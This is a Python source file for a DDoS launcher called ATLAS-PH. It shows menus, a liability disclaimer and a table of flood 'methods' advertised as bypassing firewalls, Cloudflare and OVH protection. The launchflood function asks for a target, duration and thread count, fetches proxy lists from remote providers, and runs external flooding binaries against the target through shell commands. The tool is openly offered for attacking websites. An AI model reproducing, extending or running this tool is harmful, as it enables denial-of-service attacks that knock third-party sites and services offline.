#ATLAS-PH v1
#Stealing my codes will not make you the Author you are Skid!
import os
import sys
import time
from subprocess import run
from time import sleep
from shutil import which

try:
	requests = __import__("httpx") # httpx is faster than requests
	from colorama import Fore, Back, Style
	from rich.console import Console
except Exception:
	exit("[X] Error? try this pip3 install requirements.txt")

console = Console()
tasks = [f"task {n}" for n in range(1, 3)]
with console.status("[bold green]Finding missing on files...") as status:
	while tasks:
		task = tasks.pop(0)
		sleep(1)
		console.log(f"{task} complete")
		try:
			with open("key.txt"):
				open("requirements.txt")
				open("install.sh")
				print("[X] All files Scanned Completed!")
		except IOError:
			exit("[X] Some files does not exist, Please install again!")


def getproxy() -> None:
#	print("[+] Checking Proxy Providers...")
	print("[+] Please wait...")
	with open("proxy_providers.txt", mode="r") as readurl:
#		print("[+] Downloading Proxies...")
		for url in readurl:
			url = url.strip()
			with open("proxy.txt", mode="a") as file:
				try:
					file.write(requests.get(url, timeout=1000).text)
				except requests.ConnectError:
					exit("[X] Connection Error")
				except KeyboardInterrupt:
					exit()
		print("[+] Attack Sent Successfully!!")
		print("[+] Type 'STOP' to stop your Attack.")


def OSclear():
	os.system('clear' if os.name == 'posix' else 'cls')


def unavail():
	print("""
╔════════════════════════════════════════════════════════════════════════╗
║            SORRY THE METHOD YOU ARE TRYING IS UNAVAILABLE              ║           
╚════════════════════════════════════════════════════════════════════════╝
    """)
 
def tos():
	print("""\033[1;31;40m
╔════════════════════════════════════════════════════════════════════════╗
║                            \033[2;30;42mTERMS OF SERVICE\033[1;31;40m                            ║
╠════════════════════════════════════════════════════════════════════════╣
║ FROM ATLAS ADMIN:                                                      ║
║ We are not responsible.                                                ║
║ if any of you who do not own a website are damaged,                    ║ 
║ before you use this tool you must accept our TOS, for confirmation     ║  
║ and a promise that we will not be held responsible for the             ║ 
║ damage you have done to the damaged website.                           ║
╚════════════════════════════════════════════════════════════════════════╝

    """)
	while 1:
		accept = input("Do you agree in our TOS [Y/N]: ")
		if accept in ["y", "Y", "yes", "YES"]:
			sleep(2)
			print("[X] Proceeding...")
			menu()
		elif accept in ["n", "N", "no", "NO"]:
			sleep(2)
			exit("GOODBYE")
		elif accept in "":
			pass
		else:
			OSclear()
			tos()


def banner():
	print("""\033[1;32;40m
    \033[1;31;40m-- [ \033[2;30;42mCONNECTION ESTABLISHED\033[1;31;40m ] --\033[1;32;40m
        ╔═╗╔╦╗╦  ╔═╗╔═╗   ╔═╗╦ ╦
        ╠═╣ ║ ║  ╠═╣╚═╗───╠═╝╠═╣
        ╩ ╩ ╩ ╩═╝╩ ╩╚═╝   ╩  ╩ ╩\033[1;31;40m
     -- \033[1;32;40mANONPRIXOR \033[1;31;40m & \033[1;32;40mF34RL3SS \033[1;31;40m & \033[1;32;40mAYA \033[1;31;40m -- 
      Type dev to see who develop
    """)

def repeater():
	while 1:
		repeat = input("[Atlas Bot] Do you want to go back to menu? [Y/N]: ")
		if repeat in ["y", "Y", "yes", "YES"]:
			sleep(2)
			print("[X] Proceeding...")
			menu()
		elif repeat in ["n", "N", "no", "NO"]:
			exit()
		elif repeat in "":
			pass
		else:
			OSclear()
			menu()


def menu():
	OSclear()
	banner()
	print("""
╔════════════════════════════════════════════════════════════╗
║    [1] USER INFO \033[1;32;40m[See user info, VIP or NON-VIP]\033[1;31;40m           ║
║    [2] METHODS \033[1;32;40m[View Methods]\033[1;31;40m                              ║
║    [3] FILE UPDATE \033[1;32;40m[You can see new updates in our Files]  \033[1;31;40m║
╚════════════════════════════════════════════════════════════╝

    """)
	while 1:
		choose1 = input("atlas-api@free@#~> ")
		if choose1 in ["1", "user", "userinfo", "info"]:
			userinfo()
		elif choose1 in ["2", "methods", "METHODS"]:
			launchflood()
		elif choose1 in ["3", "fileupdate", "update"]:
			fileupdate()
		elif choose1 in ["dev", "developer"]:
			developer()
		elif (choose1 == ""):
			pass

#UserINFO
def userinfo():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     USER TYPE: \033[1;32;40mFREE-USER        \033[1;31;40m                           ║
║     ADMIN PERM: \033[1;32;40mNO PERMISSION     \033[1;31;40m                         ║
║     ATTACK TIME: \033[1;32;40mUNLIMITED       \033[1;31;40m                          ║
║     USER EXPIRATION: \033[1;32;40mJanuary 1, 2038    \033[1;31;40m                   ║
║     METHODS ACCESS: \033[1;32;40mTRUE              \033[1;31;40m                     ║
╚════════════════════════════════════════════════════════════╝
    """)
    repeater()

def methodbanner():
	print("""
╔═════════════════╦═══════════════════════╦══════════════════════╦═════════════════════╗
║    \033[1;37;40mMETHODS      \033[1;31;40m║      \033[1;37;40mINFORMATION      \033[1;31;40m║      \033[1;37;40mPERMISSION      \033[1;31;40m║       \033[1;37;40mSTATUS        \033[1;31;40m║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║  \033[1;36;40mATLAS-YOLANDA  \033[1;31;40m║ \033[1;36;40mBYPASS SOME FIREWALLS \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mATLAS-STORM   \033[1;31;40m║  \033[1;36;40mBYPASS NORMAL CLOUD  \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mATLAS-HTTPS   \033[1;31;40m║  \033[1;36;40mHTTPS-PROXY ATTACK   \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mATLAS-NULL    \033[1;31;40m║ \033[1;36;40mBYPASS OVH-DIGI SITES \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mATLAS-UAM     \033[1;31;40m║ \033[1;36;40mBYPASS CLOUDFLARE UAM \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║     \033[1;31;47mUNAVAILABLE\033[1;31;40m     ║
╚═════════════════╩═══════════════════════╩══════════════════════╩═════════════════════╝
    """)
  
def launchflood():
	OSclear()
	methodbanner()
	while 1:
		methods = input("[X] Choose Methods: ")
		if methods in ["ATLAS-YOLANDA", "atlas-yolanda"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [3]: "))
				getproxy()
				run([f'screen -dm ./methods/ATLAS-METHODY {target} {floodtime} {thread} proxy.txt proxy.txt'], shell=True)
			except:
				print("Error try again")
		elif methods in ["ATLAS-STORM", "atlas-storm"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} storm {thread}'], shell=True)
			except:
				print("Error try again")
		elif methods in ["ATLAS-HTTPS", "atlas-https"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy {thread}'], shell=True)
			except:
				print("Error try again")
		elif  methods in ["ATLAS-NULL", "atlas-null"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} null-x {thread}'], shell=True)
			except:
				print("Error try again")
		elif methods in ["ATLAS-UAM", "atlas-uam"]:
			unavail()
			repeater()
		elif methods in "":
			pass
		elif methods in ["clear", "CLEAR", "cls", "CLS"]:
			OSclear(); methodbanner()
		elif methods in ["stop", "STOP"]:
			run(["pkill screen"], shell=True)
			print("[+] Attack Stopped!")
		else:
		   print("[X] Invalid Method")
    #if (methods == "ATLAS-UAM") or (methods == "atlas-uam"):
    #    target = input("[X] Target: ")
    #    time = input("[X] Time: ")
    #    thread = input("[X] Threads [5-10]: ")
    #    run([f'./methods/ATLAS-METHODS {target} {time} uam {thread}'], shell=True)


#FileUpdates
def fileupdate():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     FILE VERSION: \033[1;32;40mV2 \033[1;31;40m                                      ║
║     LAST UPDATE: \033[1;32;40mNovember 6, 2022   \033[1;31;40m                       ║
║     NEXT UPDATE: \033[1;32;40mView on my GITHUB  \033[1;31;40m                       ║
╚════════════════════════════════════════════════════════════╝   
    """)
    repeater()

#DeveloperInfo
def developer():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     DEVELOPER: ANONPRIXOR                                  ║
║     COMPILED SCRIPTS: F34RL3SS & AYA                          ║        
╚════════════════════════════════════════════════════════════╝

    """)
    repeater()

def main():
	print("[+] Checking Dependencies...\n")
	pkgs = ['screen']
	install = True
	for pkg in pkgs:
		ok = which(pkg)
		if ok == None:
			print(f"[X] {pkg} is not installed!\n")
			install = False
		else:
			pass
	if install == False:
		exit(f'[?] Error? try: sh install.sh')
	else:
		OSclear()
		tos()

if __name__ == "__main__":
	main()
